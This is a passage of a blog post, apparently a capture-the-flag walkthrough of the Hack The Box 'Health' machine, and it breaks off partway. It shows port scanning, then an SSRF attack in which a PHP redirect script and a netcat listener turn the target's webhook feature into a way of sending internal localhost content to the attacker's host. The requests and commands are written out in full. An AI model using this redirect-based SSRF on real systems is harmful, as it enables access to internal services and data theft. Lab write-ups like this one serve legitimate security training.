<!DOCTYPE html>









<!-- `site.alt_lang` can specify a language different from the UI -->
<html lang="en"
  
    data-mode="dark"
  
>

  <!--
  The Head
-->

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  

    

    

  

  

  
    
    
    

    
      <!-- it's a local file path -->

    
  

  
    <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.3.2" />
<meta property="og:title" content="Hack The Box - Health" />
<meta property="og:locale" content="en" />
<meta name="description" content="This was a difficult, but fun machine. It came out as an easy machine before being reclassified as medium. It took me a long time before I finally pwned it." />
<meta property="og:description" content="This was a difficult, but fun machine. It came out as an easy machine before being reclassified as medium. It took me a long time before I finally pwned it." />
<link rel="canonical" href="http://localhost:4000/posts/HackTheBox-Walkthrough-Health/" />
<meta property="og:url" content="http://localhost:4000/posts/HackTheBox-Walkthrough-Health/" />
<meta property="og:site_name" content="Ankit Kanojiya" />
<meta property="og:image" content="http://localhost:4000/assets/images/Health/H.png" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2023-01-07T00:00:00+08:00" />
<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:image" content="http://localhost:4000/assets/images/Health/H.png" />
<meta property="twitter:title" content="Hack The Box - Health" />
<meta name="twitter:site" content="@AnkitKanojiya69" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2023-01-07T00:00:00+08:00","datePublished":"2023-01-07T00:00:00+08:00","description":"This was a difficult, but fun machine. It came out as an easy machine before being reclassified as medium. It took me a long time before I finally pwned it.","headline":"Hack The Box - Health","image":"http://localhost:4000/assets/images/Health/H.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/HackTheBox-Walkthrough-Health/"},"url":"http://localhost:4000/posts/HackTheBox-Walkthrough-Health/"}</script>
<!-- End Jekyll SEO tag -->

  

  <title>Hack The Box - Health | Ankit Kanojiya
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">
<link rel="manifest" href="/assets/img/favicons/site.webmanifest">
<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="Ankit Kanojiya">
<meta name="application-name" content="Ankit Kanojiya">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  

    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
      <link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin>
    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://cdn.jsdelivr.net" >
      <link rel="dns-prefetch" href="https://cdn.jsdelivr.net" >
    

    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap">

  

  <!-- GA -->
  

  <!-- Bootstrap -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css">

  <link rel="stylesheet" href="/assets/css/style.css">

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css">
  

  
    <!-- Manific Popup -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css">
  

  <!-- JavaScript -->

  <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>

  
</head>


  <body data-spy="scroll" data-target="#toc" data-topbar-visible="true">

    <!--
  The Side Bar
-->

<div id="sidebar" class="d-flex flex-column align-items-end">
  <div class="profile-wrapper text-center">
    <div id="avatar">
      <a href="/" class="mx-auto">
        
          
          <img src="/assets/img/avtar.jpg" alt="avatar" onerror="this.style.display='none'">
        
      </a>
    </div>

    <div class="site-title">
      <a href="/">Ankit Kanojiya</a>
    </div>
    <div class="site-subtitle font-italic">ùêÑùê≠ùê°ùê¢ùêúùêöùê• ùêáùêöùêúùê§ùêûùê´ || ùêíùê®ùêüùê≠ùê∞ùêöùê´ùêû ùêÑùêßùê†ùê¢ùêßùêûùêûùê´ || ùêÇùê≤ùêõùêûùê´ ùêíùêûùêúùêÆùê´ùê¢ùê≠ùê≤ ùêëùêûùê¨ùêöùê´ùêúùê°ùêûùê´.!! ùêéùêíùêÇùêè & ùêéùêíùêÑùêè.</div>

  </div><!-- .profile-wrapper -->

  <ul class="w-100">

    <!-- home -->
    <li class="nav-item">
      <a href="/" class="nav-link">
        <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i>
        <span>HOME</span>
      </a>
    </li>
    <!-- the real tabs -->
    
    <li class="nav-item">
      <a href="/categories/" class="nav-link">
        <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>CATEGORIES</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/tags/" class="nav-link">
        <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>TAGS</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/archives/" class="nav-link">
        <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>ARCHIVES</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/about/" class="nav-link">
        <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>ABOUT</span>
      </a>
    </li> <!-- .nav-item -->
    

  </ul> <!-- ul.nav.flex-column -->

  <div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center">

    

    
      

      
      <a href="https://github.com/ankit0183" aria-label="github"
        target="_blank" rel="noopener">
        <i class="fab fa-github"></i>
      </a>
      

    
      

      
      <a href="https://twitter.com/AnkitKanojiya69" aria-label="twitter"
        target="_blank" rel="noopener">
        <i class="fab fa-twitter"></i>
      </a>
      

    
      

      
      <a href="
          javascript:location.href = 'mailto:' + ['ankitkanojiya','yandex.ru'].join('@')" aria-label="email"
        >
        <i class="fas fa-envelope"></i>
      </a>
      

    
      

      
      <a href="/feed.xml" aria-label="rss"
        >
        <i class="fas fa-rss"></i>
      </a>
      

    

  </div> <!-- .sidebar-bottom -->

</div><!-- #sidebar -->


    <!--
  The Top Bar
-->

<div id="topbar-wrapper">
  <div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4">
    <span id="breadcrumb">

    

    

      

        
          <span>
            <a href="/">
              Home
            </a>
          </span>

        

      

        

      

        

          
            <span>Hack The Box - Health</span>
          

        

      

    

    </span><!-- endof #breadcrumb -->

    <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i>

    <div id="topbar-title">
      Post
    </div>

    <i id="search-trigger" class="fas fa-search fa-fw"></i>
    <span id="search-wrapper" class="align-items-center">
      <i class="fas fa-search fa-fw"></i>
      <input class="form-control" id="search-input" type="search"
        aria-label="search" autocomplete="off" placeholder="Search...">
    </span>
    <span id="search-cancel" >Cancel</span>
  </div>

</div>


    <div id="main-wrapper" class="d-flex justify-content-center">
      <div id="main" class="container pl-xl-4 pr-xl-4">
        





<div class="row">

  <!-- core -->
  <div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4">
    <div class="post pl-1 pr-1 pl-md-2 pr-md-2">

    

    
      
      
        <!--
  Refactor the HTML structure.
-->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Change the icon of checkbox -->


<!-- images -->




  
  

  
    
      
      
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      
        
      
      

      
      

      

      
    
      
      
        

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      

      
      

      

      
    

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      

      
      

      

      
    

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      

      
      

      

      
    

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  

  



<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    

    

  

  
  

  

  
  

  

  
  

  




<!-- Wrap prompt element of blockquote with the <div> tag -->







<!-- return -->

<h1 data-toc-skip>Hack The Box - Health</h1>

<div class="post-meta text-muted">
    <!-- published date -->
    <span>
      Posted
      <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em class=""
    data-ts="1673020800"
    data-df="ll"
    data-toggle="tooltip" data-placement="bottom">
  Jan  7, 2023
</em>

    </span>

    <!-- lastmod date -->
    

  
    

    <div class="mt-3 mb-3">
      <img data-src="/assets/images/Health/H.png" class="preview-img bg"
        alt="Preview Image"

      

       data-proofer-ignore>

      

    </div>
  

  <div class="d-flex justify-content-between">
    <!-- author(s) -->
    <span>
      

      By

      <em>
      
        <a href="https://twitter.com/AnkitKanojiya69">Ankit Kanojiya</a>
      
      </em>
    </span>

    <div>
      <!-- page views -->
      

      <!-- read time -->
      <!--
  Calculate the post's reading time, and display the word count in tooltip
 -->



<!-- words per minute  -->










<!-- return element -->
<span class="readtime" data-toggle="tooltip" data-placement="bottom"
  title="2926 words">
  <em>16 min</em> read</span>

    </div>

  </div> <!-- .d-flex -->

</div> <!-- .post-meta -->

<div class="post-content">
  <p>This was a difficult, but fun machine. It came out as an easy machine before being reclassified as medium. It took me a long time before I finally pwned it.</p>

<p>It started with using a web application to reach an internal application and perform SQL Injection. Then I used the same application to read files on the server and become root.</p>

<ul>
  <li>Room: Health</li>
  <li>Difficulty: Medium</li>
  <li>URL: <a href="https://app.hackthebox.com/machines/Health">https://app.hackthebox.com/machines/Health</a></li>
  <li>Author: <a href="https://app.hackthebox.com/users/476556">irogir</a></li>
</ul>

<h2 id="enumeration"><span class="mr-2">Enumeration</span><a href="#enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>I launch rustscan to look for opened ports on the server.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>rustscan <span class="nt">-a</span> target <span class="nt">--</span> <span class="nt">-A</span> | <span class="nb">tee </span>rust.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| <span class="o">{}</span>  <span class="o">}</span>| <span class="o">{</span> <span class="o">}</span> |<span class="o">{</span> <span class="o">{</span>__ <span class="o">{</span>_   _<span class="o">}{</span> <span class="o">{</span>__  /  ___<span class="o">}</span> / <span class="o">{}</span> <span class="se">\ </span>|  <span class="sb">`</span>| |
| .-. <span class="se">\|</span> <span class="o">{</span>_<span class="o">}</span> |.-._<span class="o">}</span> <span class="o">}</span> | |  .-._<span class="o">}</span> <span class="o">}</span><span class="se">\ </span>    <span class="o">}</span>/  /<span class="se">\ </span> <span class="se">\|</span> |<span class="se">\ </span> |
<span class="sb">`</span>-<span class="s1">' `-'</span><span class="sb">`</span><span class="nt">-----</span><span class="s1">'`----'</span>  <span class="sb">`</span>-<span class="s1">'  `----'</span>  <span class="sb">`</span><span class="nt">---</span><span class="s1">' `-'</span>  <span class="sb">`</span>-<span class="s1">'`-'</span> <span class="sb">`</span>-<span class="s1">'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/ehogue/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan'</span>s speed. Use the Docker image, or up the Ulimit with <span class="s1">'--ulimit 5000'</span><span class="nb">.</span>
Open 10.129.134.205:22
Open 10.129.134.205:80

...

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey:
|   2048 32:b7:f4:d4:2f:45:d3:30:ee:12:3b:03:67:bb:e6:31 <span class="o">(</span>RSA<span class="o">)</span>
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQChNRnKkpENG89qQHjD+2Kt9H7EDTMkQpzin70Rok0geRogbYVckxywChDv3yYhaDWQ9RrsOcWLs3uGzZR9nCfXOE3uTENbSWV5GdCd3wQNmWcSlkTD4dRcZshaAoMjs1bwzhK+cOy3ZU/ywbIXdHvAz3+Xvyz5yoEnboWYdWtBNFniZ7y/mZtA/XN19sCt5Pcme
Y40YFSuaVy/PUQnozplBVBIN6W5gnSE0Y+3J1MLBUkvf4+5zKvC+WLqA394Y1M+/UcVcPAjo6maik1JZNAmquWWo+y+28PdXSm9F2p2HAvwJjXc96f+Fl80+P4j1yxrhWC5AZM8fNCX8FjD7Jl7
|   256 86:e1:5d:8c:29:39:ac:d7:e8:15:e6:49:e2:35:ed:0c <span class="o">(</span>ECDSA<span class="o">)</span>
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOR0vwVJwhe/5A7dkomT/li2XC2nvv6/4J6Oe8Xeyi/YQspx3RQGz3aG1sWTPstLu7yno0Z+Lk/GotRdyivSdLA<span class="o">=</span>
|   256 ef:6b:ad:64:d5:e4:5b:3e:66:79:49:f4:ec:4c:23:9f <span class="o">(</span>ED25519<span class="o">)</span>
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINgiR3y8U+HenhKVoN1EFipbmC6EjO3fWwWPUqa8EeJh
80/tcp open  http    syn-ack Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
| http-methods:
|_  Supported Methods: GET HEAD OPTIONS
|_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: HTTP Monitoring Tool
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</pre></td></tr></tbody></table></code></div></div>

<p>There were 2 open ports:</p>
<ul>
  <li>22 - SSH</li>
  <li>80 - HTTP</li>
</ul>

<h2 id="webhooks"><span class="mr-2">Webhooks</span><a href="#webhooks" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>I launched a browser and looked at the website.</p>

<p><img data-src="/assets/images/Health/MainSite.png" alt="Website" title="Website" data-proofer-ignore></p>

<p>The site allowed checking if another site was up. And sent the site content to a webhook.</p>

<p>I started a web server on my machine and tried the application.</p>

<p><img data-src="/assets/images/Health/Testing.png" alt="Testing" title="Testing" data-proofer-ignore></p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>python <span class="nt">-m</span> http.server 80
Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
10.10.11.176 - - <span class="o">[</span>05/Jan/2023 06:34:28] code 404, message File not found
10.10.11.176 - - <span class="o">[</span>05/Jan/2023 06:34:28] <span class="s2">"GET /monitored HTTP/1.0"</span> 404 -
10.10.11.176 - - <span class="o">[</span>05/Jan/2023 06:34:28] code 501, message Unsupported method <span class="o">(</span><span class="s1">'POST'</span><span class="o">)</span>
10.10.11.176 - - <span class="o">[</span>05/Jan/2023 06:34:28] <span class="s2">"POST /payload HTTP/1.1"</span> 501 -
</pre></td></tr></tbody></table></code></div></div>

<p>It worked, but I needed something else to grab the content of the payload. I launched netcat on another port and used that for the payload URL.</p>

<div class="language-http highlighter-rouge"><div class="code-header">
        <span data-label-text="Http"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre><span class="nf">POST</span> <span class="nn">/payload/</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">10.10.14.6</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">*/*</span>
<span class="na">Content-type</span><span class="p">:</span> <span class="s">application/json</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">117</span>

<span class="p">{</span><span class="nl">"webhookUrl"</span><span class="p">:</span><span class="s2">"http:</span><span class="se">\/\/</span><span class="s2">10.10.14.6:8000</span><span class="se">\/</span><span class="s2">payload</span><span class="se">\/</span><span class="s2">"</span><span class="p">,</span><span class="nl">"monitoredUrl"</span><span class="p">:</span><span class="s2">"http:</span><span class="se">\/\/</span><span class="s2">10.10.14.6</span><span class="se">\/</span><span class="s2">monitored</span><span class="se">\/</span><span class="s2">"</span><span class="p">,</span><span class="nl">"health"</span><span class="p">:</span><span class="s2">"down"</span><span class="p">}</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>I started playing with sending different payloads to the application. I found out I could send it json instead of a URL-encoded form. This made it easier to read and modify in Burp Repeater.</p>

<div class="language-http highlighter-rouge"><div class="code-header">
        <span data-label-text="Http"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre></td><td class="rouge-code"><pre><span class="nf">POST</span> <span class="nn">/webhook</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">target.htb</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span>
<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/json</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">224</span>
<span class="na">Origin</span><span class="p">:</span> <span class="s">http://target.htb</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">Referer</span><span class="p">:</span> <span class="s">http://target.htb/</span>
<span class="na">Cookie</span><span class="p">:</span> <span class="s">XSRF-TOKEN=eyJpdiI6ImFsOEk3M21rVHVuTU8yRkwrc1JSeHc9PSIsInZhbHVlIjoieVBGWlc1WVBiVUFKdjV2MWRqQUorYWNxd0wwaFMwQUQ2RTFzRG9iSDJjb0lmUWJVS3dVa2RUZmtiUXBIUW85ckpZUUJVMGFPQXdERFFuaUR1SW1Mam5WUDhGSTNxdjIzWFhQVUZGcXExc2dsamJYdXhha0JBUmpXekFuR0tDN3YiLCJtYWMiOiJiMDdmMmNkMDM1ZGExMzM3OGUwMmJjNmFjNzA1NDYxNWYyYzkwOTIyNWRiZDkxZGU3M2ViY2JkM2MwNTg0MDIyIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6Ilk4M05WQWFmNVJSMVJoc2txNSt6Q0E9PSIsInZhbHVlIjoiZFVzOFAweStjMm9ENHZnL3VBQkMvZ1RLeVphTVovNW9PSFplYnpQeTBuTjBRKzlPRkQyb213dVN3bEhRWXNSemFqR1k1TXU0YW1ZRXhKZk85WEJmcVR4ZXZiVjVnNkR6b0Rwdno1aWI4dmI2UkQyVXhYa0JIMzBDUXlRcG54N2EiLCJtYWMiOiJkN2Q3YmE0NGFhNTRhN2YyNWFmZTQ4OWU3YTYyNzY5NjY5N2RlMzYzMGUxN2U4YzMzMGZiNjU5MzQ3ZWZmODZlIiwidGFnIjoiIn0%3D</span>
<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>

<span class="p">{</span><span class="w">
	</span><span class="nl">"_token"</span><span class="p">:</span><span class="w"> </span><span class="s2">"6RWanPgljj9laRaM3gHG9xNHPgibNdgtqUeN0EDO"</span><span class="p">,</span><span class="w">
	</span><span class="nl">"webhookUrl"</span><span class="p">:</span><span class="w"> </span><span class="s2">"http://10.10.14.6:8000/payload"</span><span class="p">,</span><span class="w">
	</span><span class="nl">"monitoredUrl"</span><span class="p">:</span><span class="w"> </span><span class="s2">"http://10.10.14.6/monitored"</span><span class="p">,</span><span class="w">
	</span><span class="nl">"frequency"</span><span class="p">:</span><span class="w"> </span><span class="s2">"* * * * *"</span><span class="p">,</span><span class="w">
	</span><span class="nl">"onlyError"</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w">
	</span><span class="nl">"action"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Test"</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>I also saw that if the monitored website was up, the content was sent to the webhook.</p>

<div class="language-json highlighter-rouge"><div class="code-header">
        <span data-label-text="JSON"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre><span class="p">{</span><span class="w">
  </span><span class="nl">"webhookUrl"</span><span class="p">:</span><span class="s2">"http:</span><span class="se">\/\/</span><span class="s2">10.10.14.6:8000</span><span class="se">\/</span><span class="s2">payload"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"monitoredUrl"</span><span class="p">:</span><span class="s2">"http:</span><span class="se">\/\/</span><span class="s2">10.10.14.6</span><span class="se">\/</span><span class="s2">monitored"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"health"</span><span class="p">:</span><span class="s2">"up"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"body"</span><span class="p">:</span><span class="s2">"&lt;html&gt;</span><span class="se">\n</span><span class="s2">&lt;body&gt;</span><span class="se">\n</span><span class="s2">Test</span><span class="se">\n</span><span class="s2">&lt;</span><span class="se">\/</span><span class="s2">body&gt;</span><span class="se">\n</span><span class="s2">&lt;</span><span class="se">\/</span><span class="s2">html&gt;</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"message"</span><span class="p">:</span><span class="s2">"HTTP</span><span class="se">\/</span><span class="s2">1.0 200 OK"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"headers"</span><span class="p">:{</span><span class="nl">"Host"</span><span class="p">:</span><span class="s2">"10.10.14.6"</span><span class="p">,</span><span class="nl">"Date"</span><span class="p">:</span><span class="s2">"Thu, 05 Jan 2023 11:48:36 GMT"</span><span class="p">,</span><span class="nl">"Connection"</span><span class="p">:</span><span class="s2">"close"</span><span class="p">,</span><span class="nl">"Content-Type"</span><span class="p">:</span><span class="s2">"text</span><span class="se">\/</span><span class="s2">html; charset=UTF-8"</span><span class="p">,</span><span class="nl">"Content-Length"</span><span class="p">:</span><span class="s2">"35"</span><span class="p">}</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>I thought I could use <a href="https://portswigger.net/web-security/ssrf">Server-Side Request Forgery (SSRF)</a> to read from the web server.</p>

<p>I tried monitoring things like localhost, and files on the server. But they were rejected.</p>

<p><img data-src="/assets/images/Health/Errors.png" alt="Errors" title="Errors" data-proofer-ignore></p>

<p>There was some validation to prevent things like <code class="language-plaintext highlighter-rouge">localhost</code> and <code class="language-plaintext highlighter-rouge">file://</code>. I tried using my machine as the monitored URL and sending a redirection from it.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">cat </span>redirect.php            
&lt;?php
header<span class="o">(</span><span class="s2">"Location: http://localhost/"</span><span class="o">)</span><span class="p">;</span>

<span class="nv">$ </span>php <span class="nt">-S</span> 0.0.0.0:80 
<span class="o">[</span>Thu Jan  5 06:59:48 2023] PHP 8.1.12 Development Server <span class="o">(</span>http://0.0.0.0:80<span class="o">)</span> started
<span class="o">[</span>Thu Jan  5 07:00:19 2023] 10.10.11.176:48094 Accepted
<span class="o">[</span>Thu Jan  5 07:00:19 2023] 10.10.11.176:48094 <span class="o">[</span>302]: GET /redirect.php
<span class="o">[</span>Thu Jan  5 07:00:19 2023] 10.10.11.176:48094 Closing
</pre></td></tr></tbody></table></code></div></div>

<p>It worked, my webhook received the content of the application.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>nc <span class="nt">-klvnp</span> 8000
listening on <span class="o">[</span>any] 8000 ...
connect to <span class="o">[</span>10.10.14.6] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.176] 52638
POST /payload HTTP/1.1
Host: 10.10.14.6:8000
Accept: <span class="k">*</span>/<span class="k">*</span>
Content-type: application/json
Content-Length: 8993
Expect: 100-continue

<span class="o">{</span>
  <span class="s2">"webhookUrl"</span>: <span class="s2">"http://10.10.14.6:8000/payload"</span>,
  <span class="s2">"monitoredUrl"</span>: <span class="s2">"http://10.10.14.6/redirect.php"</span>,
  <span class="s2">"health"</span>: <span class="s2">"up"</span>,
